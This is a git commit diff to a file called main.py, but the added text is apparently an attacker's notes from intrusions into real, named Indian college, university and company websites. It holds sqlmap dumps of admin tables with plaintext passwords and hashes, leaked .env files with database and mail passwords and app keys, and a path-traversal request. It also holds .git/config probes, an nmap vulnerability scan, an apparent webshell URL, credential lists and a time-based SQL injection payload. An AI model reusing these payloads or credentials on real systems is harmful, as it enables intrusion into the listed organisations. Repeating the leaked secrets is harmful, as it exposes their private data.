3c5aadbbc90abbc8943bc2d58e9f1641a7fb8845
cheveyo1 <138849762+cheveyo1@users.noreply.github.com>
2023-09-03 20:50:09 +0800

    Update main.py

--- main.py
+++ main.py
@@ -8,17 +8,351 @@ Host: cstep.in
 Connection: Keep-alive
 
 
+42betipl@gmail.com
+42Bet421234
 
-ie
-bin
-images
-fonts
-script
-pms
-pms/EduDocFile/
-pms/EmpSRFile/
-pms/GPF/
-pms/GPFEntry/
+===========================
+https://bsptcl.in/admin/
+
+
+=====================================================
+patkarvardecollege.edu.in
+
+
+======================================================
+
+siddharthagroup.co.in
+Database: arise_sgidb
+Table: users
+[1 entry]
++----+----------------------------------+----------------------------+---------------------+
+| id | password                         | username                   | created_at          |
++----+----------------------------------+----------------------------+---------------------+
+| 21 | d020bdd021278a0b91a6637c77a8372e | info@siddharthagroup.co.in | 2020-05-22 23:28:36 |
+
+sql-shell> select @@datadir
+[16:01:25] [INFO] fetching SQL SELECT statement query output: 'select @@datadir'
+select @@datadir: '/var/lib/mysql/'
+======================================================
+www.emamiltd.in
+
+Database: Emam192213bc
+Table: tbladmin
+[3 entries]
++----+----------------------------+------------------+---------+----------+----------+------------------+----------+-----------+
+| id | sessionid                  | email            | phone   | status   | lastname | password         | username | firstname |
++----+----------------------------+------------------+---------+----------+----------+------------------+----------+-----------+
+| 1  | evanqn4gt9dot4479mnl5rl0d0 | info@emamiltd.in | <blank> | 0        | <blank>  | EMAMILIMITED123@ | admin    | emami     |
+| 2  | gh7r451gfi2h8fph91p9l1pqo7 | <blank>          | <blank> | 0        | <blank>  | bcwtest          | bcwtest  | <blank>   |
+| 3  | q4d6jb22qi7mkp9kr3mrpbu0r6 | <blank>          | <blank> | 0        | <blank>  | eadmin@123!@#    | eadmin   | <blank>   |
++----+----------------------------+------------------+---------+----------+----------+------------------+----------+-----------+
+
+[16:07:00] [INFO] table 'Emam192213bc.tbladmin' dumped to CSV file '/root/.local/share/sqlmap/output/www.emamiltd.in/dump/Emam192213bc/tbladmin.csv'
+[16:07:00] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/www.emamiltd.in'
+======================================================
+siddharthagroup.co.in
+
+back-end DBMS: MySQL >= 5.6
+Database: arise_sgidb
+Table: users
+[1 entry]
++----+----------------------------------+----------------------------+---------------------+
+| id | password                         | username                   | created_at          |
++----+----------------------------------+----------------------------+---------------------+
+| 21 | d020bdd021278a0b91a6637c77a8372e | info@siddharthagroup.co.in | 2020-05-22 23:28:36 |
++----+----------------------------------+----------------------------+---------------------+
+
+[09:59:11] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/siddharthagroup.co.in'
+======================================================
+
+https://apsfl.in/admin/
+
+======================================================
+
+https://cstep.in/phpmyadmin/
+
+======================================================
+mau.ac.in
+Database: mau
+Table: adminusers
+[1 entry]
++----+------------------+---------------+---------------------+
+| id | password         | username      | lastlogin           |
++----+------------------+---------------+---------------------+
+| 1  | @!!786!mau#T2023 | mauUniversity | 2021-09-23 18:34:21 |
++----+------------------+---------------+---------------------+
+
+[16:22:53] [INFO] table 'mau.adminusers' dumped to CSV file '/root/.local/share/sqlmap/output/mau.ac.in/dump/mau/adminusers.csv'
+[16:22:53] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/mau.ac.in'
+
+[*] ending @ 04:22:53 PM /2023-09-03/
+======================================================
+
+tpq891
+ahsdyyb.com/config/web.ini.php
+admin
+yxlxm.cn/indclude/ckeditor/
+zdwx.aydzd.cn/cms/upload/images/2023/09/03/1693726684ykzh.php?eanver=left
+======================================================
+
+https://faculty.learnpunjabi.org/
+
+http://colleges.learnpunjabi.org/login.php
+
+===========================
+
+https://www.sntd.in/snttollmelli/forms/login.aspx
+
+===========================
+https://cmai.in/
+
+DB_CONNECTION=mysql
+DB_HOST=localhost
+DB_PORT=3306
+DB_DATABASE=cmai-event-2021
+DB_USERNAME=root
+DB_PASSWORD=s@LCm@!Mumba$F@f
+
+
+REDIS_HOST=127.0.0.1
+REDIS_PASSWORD=null
+REDIS_PORT=6379
+
+MAIL_DRIVER=smtp
+MAIL_HOST=md.qlc.co.in
+MAIL_PORT=2700
+MAIL_USERNAME=maildirect@cmai.in
+MAIL_PASSWORD=B3H@ppyA!way5
+MAIL_ENCRYPTION=null
+MAIL_FROM_ADDRESS=registration@cmai.in
+MAIL_FROM_NAME=CMAI
+MAIL_CC_ADDRESS=registration@cmai.in
+MAIL_CC_ADDRESS_2=registration@cmai.in
+
+GET /.git/config HTTP/1.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Encoding: gzip,deflate,br
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.0 Safari/537.36
+Host: cmai.in
+Connection: Keep-alive
+
+
+===========================
+nal.net.in
+
+APP_ENV=local
+APP_DEBUG=true
+APP_KEY=base64:mSdPNUZN2f397ZzIlbtzZMVNeus1bftd3rv8RiJaerM=
+APP_URL=http://localhost
+
+DB_CONNECTION=mysql
+DB_HOST=localhost
+DB_PORT=3306
+DB_DATABASE=nal_web
+DB_USERNAME=nal_web
+DB_PASSWORD=@G~NJMGrYw5D
+
+CACHE_DRIVER=file
+SESSION_DRIVER=file
+QUEUE_DRIVER=sync
+
+REDIS_HOST=127.0.0.1
+REDIS_PASSWORD=null
+REDIS_PORT=6379
+
+MAIL_DRIVER=smtp
+MAIL_HOST=mailtrap.io
+MAIL_PORT=2525
+
+
+
+=============================
+
+https://nationallawuniversitydelhi.in/
+
+POST /api/v1/external/anonymousCall HTTP/1.1
+Content-Type: application/json
+Accept: application/json, text/javascript, */*; q=0.01
+x-requested-with: XMLHttpRequest
+Referer: https://nationallawuniversitydelhi.in/
+Content-Length: 170
+Accept-Encoding: gzip,deflate,br
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+Host: nationallawuniversitydelhi.in
+Connection: Keep-alive
+
+{"path":"../../../../../../../../../../../../../../../proc/version","user_id":"","academic_year_id":"","call_meta_data":"ailet.AILETAdmissionService.getMustacheTemplate"}
+
+
+
+
+
+
+
+https://iec.edu.in/
+
+APP_NAME=Laravel
+APP_ENV=local
+APP_KEY=base64:pHd1XcmGu0wjdXcNXfezU+JpEpVp26tbPrR8aXvHQtE=
+APP_DEBUG=true
+APP_URL=http://ieccollge.test
+
+LOG_CHANNEL=stack
+LOG_DEPRECATIONS_CHANNEL=null
+LOG_LEVEL=debug
+
+DB_CONNECTION=mysql
+DB_HOST=localhost
+DB_PORT=3306
+DB_DATABASE=iecdatabase
+DB_USERNAME=tushariec
+DB_PASSWORD=ieccet@123
+
+BROADCAST_DRIVER=log
+CACHE_DRIVER=file
+FILESYSTEM_DRIVER=local
+QUEUE_CONNECTION=sync
+SESSION_DRIVER=file
+SESSION_LIFETIME=120
+
+MEMCACHED_HOST=127.0.0.1
+
+REDIS_HOST=127.0.0.1
+REDIS_PASSWORD=null
+REDIS_PORT=6379
+
+MAIL_MAILER=smtp
+
+
+
+
+
+# Nmap 7.94 scan initiated Mon Aug 28 15:41:11 2023 as: nmap --script=vuln -sV -Pn -oN result-jitnashik.edu.in jitnashik.edu.in
+Pre-scan script results:
+| broadcast-avahi-dos: 
+|   Discovered hosts:
+|     224.0.0.251
+|   After NULL UDP avahi packet DoS (CVE-2011-1002).
+|_  Hosts are all up (not vulnerable).
+Nmap scan report for jitnashik.edu.in (138.128.180.226)
+Host is up (0.13s latency).
+rDNS record for 138.128.180.226: server.chittaranjan.co.in
+Not shown: 981 filtered tcp ports (no-response)
+PORT      STATE  SERVICE  VERSION
+20/tcp    closed ftp-data
+21/tcp    open   ftp      Pure-FTPd
+| ssl-dh-params: 
+|   VULNERABLE:
+|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability
+|     State: VULNERABLE
+|       Transport Layer Security (TLS) services that use anonymous
+|       Diffie-Hellman key exchange only provide protection against passive
+|       eavesdropping, and are vulnerable to active man-in-the-middle attacks
+|       which could completely compromise the confidentiality and integrity
+|       of any data exchanged over the resulting session.
+|     Check results:
+|       ANONYMOUS DH GROUP 1
+|             Cipher Suite: TLS_DH_anon_WITH_AES_256_GCM_SHA384
+|             Modulus Type: Non-safe prime
+|             Modulus Source: RFC5114/2048-bit DSA group with 256-bit prime order subgroup
+|             Modulus Length: 2048
+|             Generator Length: 2048
+|             Public Key Length: 2048
+|     References:
+|_      https://www.ietf.org/rfc/rfc2246.txt
+22/tcp    closed ssh
+25/tcp    open   smtp?
+53/tcp    open   domain   ISC BIND 9.11.4-P2 (RedHat Enterprise Linux 7)
+| vulners: 
+|   cpe:/o:redhat:enterprise_linux:7: 
+|     	SSV:93135	10.0	https://vulners.com/seebug/SSV:93135	*EXPLOIT*
+|     	SSV:92513	10.0	https://vulners.com/seebug/SSV:92513	*EXPLOIT*
+|     	SSV:92510	10.0	https://vulners.com/seebug/SSV:92510	*EXPLOIT*
+|     	SSV:92405	10.0	https://vulners.com/seebug/SSV:92405	*EXPLOIT*
+|     	PACKETSTORM:165816	10.0	https://vulners.com/packetstorm/PACKETSTORM:165816	*EXPLOIT*
+|     	PACKETSTORM:143369	10.0	https://vulners.com/packetstorm/PACKETSTORM:143369	*EXPLOIT*
+|     	PACKETSTORM:139491	10.0	https://vulners.com/packetstorm/PACKETSTORM:139491	*EXPLOIT*
+|     	PACKETSTORM:139476	10.0	https://vulners.com/packetstorm/PACKETSTORM:139476	*EXPLOIT*
+|     	PACKETSTORM:138678	10.0	https://vulners.com/packetstorm/PACKETSTORM:138678	*EXPLOIT*
+|     	EXPLOITPACK:BD83B747C6C6A417D97824A1D81FAA5D	10.0	https://vulners.com/exploitpack/EXPLOITPACK:BD83B747C6C6A417D97824A1D81FAA5D	*EXPLOIT*
+|     	EXPLOITPACK:55F22FE44A0D6F3F9005C334804B2317	10.0	https://vulners.com/exploitpack/
+
+
+
+
+GET /.git/config HTTP/1.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Encoding: gzip,deflate,br
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+Host: chandrakantdadapatil.in
+Connection: Keep-alive
+
+
+
+
+
+SMK
+
+GAADMIN1
+GAADMIN2
+
+GAADMIN1
+A2222221
+
+SMKCCOM1
+SMKCCOM2
+
+SMKCDCO1
+SMKCDCO2
+
+usrTND01 Jadhav 
+TND11112
+
+AUDIT001
+A1111112
+
+usrTND01
+TND11112
+
+SMKCDCO1
+SMKCDCO2
+
+
+
+https://msso.in/admin-login.php
+
+
+
+POST /insert-book-seat.php HTTP/1.1
+Host: msso.in
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Content-Length: 358
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8
+Authorization: 990043eb-92e8-4c68-90c8-2d2ab5f98348
+Cache-Control: max-age=0
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=557861cfc798735a7b7388de269161da
+Origin: https://msso.in
+Referer: https://msso.in/book-seat.php
+Sec-Ch-Ua: "Chromium";v="116", "Not)A;Brand";v="24", "Brave";v="116"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "macOS"
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Sec-Gpc: 1
+Upgrade-Insecure-Requests: 1
+X-Forwarded-For: 127.0.0.1
+Accept-Encoding: gzip
+
+City=WW&Confirmation=No&Mobile=2344443333%27and%28select%2Afrom%28select%2Bsleep%2810%29%29a%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%2B1%29%3D%27&Name=SDSD&Title=%E0%A4%B8%E0%A4%AE%E0%A4%BE%E0%A4%A8+%E0%A4%A8%E0%A4%BE%E0%A4%97%E0%A4%B0%E0%A4%BF%E0%A4%95+%E0%A4%B8%E0%A4%82%E0%A4%B9%E0%A4%BF%E0%A4%A4%E0%A4%BE+%E0%A4%95%E0%A5%8D%E0%A4%AF%E0%A4%BE+%E0%A4%B9%E0%A5%88
+
+
+
+
+
 
 Database: u903684843_msso
 Table: admin_login
